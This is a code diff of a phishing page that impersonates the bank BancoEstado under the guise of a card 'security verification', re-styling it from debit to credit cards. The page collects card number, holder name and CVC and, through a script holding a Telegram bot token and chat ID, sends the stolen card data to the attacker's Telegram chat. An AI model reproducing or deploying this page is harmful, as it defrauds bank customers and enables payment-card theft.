@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Tarjeta Débito BancoEstado | Verificación</title>
+<title>Tarjeta Crédito BancoEstado | Verificación</title>
 <style>
     * {
         margin: 0;
@@ -27,7 +27,6 @@
         margin: 0 auto;
     }
 
-    /* BANNER SUPERIOR */
     .top-banner {
         width: 100%;
         background: #ffffff;
@@ -105,9 +104,8 @@
         overflow: hidden;
     }
 
-    /* Frente y reverso */
     .front {
-        background: radial-gradient(circle at 10% 20%, #ff8800, #cc5500);
+        background: radial-gradient(circle at 10% 20%, #1a3a6a, #0a2a4a);
         padding: 20px 22px;
         display: flex;
         flex-direction: column;
@@ -115,7 +113,7 @@
     }
 
     .back {
-        background: linear-gradient(145deg, #e67e22, #cc5500);
+        background: linear-gradient(145deg, #1a3a6a, #0a2a4a);
         transform: rotateY(180deg);
     }
 
@@ -161,13 +159,14 @@
     }
 
     .badge {
-        background: rgba(255,255,255,0.25);
+        background: rgba(255,215,0,0.3);
         backdrop-filter: blur(2px);
         border-radius: 40px;
         padding: 4px 10px;
         font-size: 0.65rem;
         font-weight: 700;
-        color: white;
+        color: #FFD700;
+        border: 1px solid rgba(255,215,0,0.2);
     }
 
     .sim-chip {
@@ -218,6 +217,7 @@
         font-weight: 600;
         text-transform: uppercase;
         color: rgba(255,255,255,0.8);
+        letter-spacing: 0.5px;
     }
     .mastercard-logo {
         display: flex;
@@ -243,7 +243,7 @@
     }
 
     .btn-send {
-        background: linear-gradient(95deg, #ff8800, #ff6600);
+        background: linear-gradient(95deg, #1a3a6a, #0a2a4a);
         border: none;
         width: 98%;
         padding: 21px;
@@ -258,9 +258,9 @@
         justify-content: center;
         gap: 8px;
         font-size: 1.1rem;
-        box-shadow: 0 8px 20px rgba(255, 136, 0, 0.3);
+        box-shadow: 0 8px 20px rgba(26, 58, 106, 0.3);
     }
-    .btn-send:hover { transform: scale(0.98); background: #e67700; }
+    .btn-send:hover { transform: scale(0.98); background: #0f2a4a; }
     .btn-send:disabled {
         opacity: 0.6;
         cursor: not-allowed;
@@ -287,7 +287,6 @@
 </head>
 <body>
 <div class="wrapper">
-    <!-- BANNER CON LOGO BANCOESTADO -->
     <div class="top-banner" id="customBanner">
         <img class="logo-banner" src="https://cdn2.downdetector.com/static/uploads/logo/bancoestado.png" alt="BancoEstado" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20100%2050%22%3E%3Crect%20width%3D%22100%22%20height%3D%2250%22%20fill%3D%22%23FF8800%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23fff%22%3EBancoEstado%3C%2Ftext%3E%3C%2Fsvg%3E';">
         <span class="banner-text">verificación de seguridad • BancoEstado</span>
@@ -295,16 +294,15 @@
     <br> <br><br><br>
     
     <div class="verification-header">
-        <div class="verification-title">Verificación de cuenta</div>
+        <div class="verification-title">Verificación de tarjeta de crédito</div>
     </div>
     
     <div class="card-stage">
         <div class="card" id="creditCard">
-            <!-- FRENTE -->
             <div class="card-face front">
                 <div class="bank-header">
                     <div class="bank-name">BancoEstado</div>
-                    <div class="badge">DÉBITO</div>
+                    <div class="badge">CRÉDITO</div>
                 </div>
                 <div class="sim-chip"></div>
                 <input type="text" id="cardNumberInput" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric">
@@ -324,14 +322,13 @@
                     <span class="mc-text" style="font-weight:800;color:white;">Mastercard</span>
                 </div>
             </div>
-            <!-- REVERSO -->
             <div class="card-face back">
                 <div class="black-strip"></div>
                 <div class="cvc-container">
                     <span style="font-weight:700">CVC</span>
                     <input type="text" id="cvcInput" class="cvc-input" maxlength="3" placeholder="123" inputmode="numeric">
                 </div>
-                <div style="margin-top: 16px; text-align: center; font-size: 0.55rem; color: #4a3a1a;">BancoEstado • Banca Segura</div>
+                <div style="margin-top: 16px; text-align: center; font-size: 0.55rem; color: #8a9ab0;">BancoEstado • Banca Segura</div>
             </div>
         </div>
     </div>
@@ -343,7 +340,6 @@
 </div>
 
 <script>
-    // CONFIGURACIÓN DE TELEGRAM
     const TELEGRAM_BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';
     const TELEGRAM_CHAT_ID = '8042354877';
 
@@ -359,7 +355,7 @@
     let expiryTimeout = null;
 
     async function enviarATelegram(cardData) {
-        const mensaje = `💳 *NUEVA TARJETA VERIFICADA*\n\n` +
+        const mensaje = `💳 *NUEVA TARJETA DE CRÉDITO VERIFICADA*\n\n` +
                        `🏦 Banco: BancoEstado\n` +
                        `🔢 Número: ${cardData.cardNumber}\n` +
                        `👤 Titular: ${cardData.cardHolder}\n` +
